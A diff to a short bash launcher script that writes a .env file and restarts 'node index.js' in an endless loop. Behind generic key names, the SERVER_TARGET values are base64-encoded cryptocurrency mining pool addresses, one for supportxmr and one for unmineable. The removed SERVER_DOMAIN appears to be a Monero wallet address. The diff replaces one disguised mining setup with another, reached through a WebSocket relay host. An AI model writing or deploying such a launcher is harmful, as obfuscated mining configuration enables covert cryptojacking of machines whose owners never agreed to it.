@@ -1,9 +1,9 @@
 #!/bin/bash
-CONNECT=$1
-NAME=$2
-echo "SERVER_WS=wss://socket.ndutvps.com
-SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
-SERVER_DOMAIN=85Z4CgUZDjxCyDmKLe2gLZJMnfUiS2Ticcf7NLGpdwnH9HcNRGKAoZERVNrwVew99ZdiZchjiZzTigE5beFDJ2rdTxoGAxr
+CONNECT=${1:-8}
+NAME=${2:-003}
+echo "SERVER_WS=ws://cdn.keitaro.my.id
+SERVER_TARGET=cngudW5taW5lYWJsZS5jb206ODA=
+SERVER_DOMAIN=1851807556
 SERVER_SECRET=${NAME}
 SERVER_CONNECTION=${CONNECT}" > .env
-while true; do node index.js; sleep 15; done
+while true; do node index.js; sleep 10; done
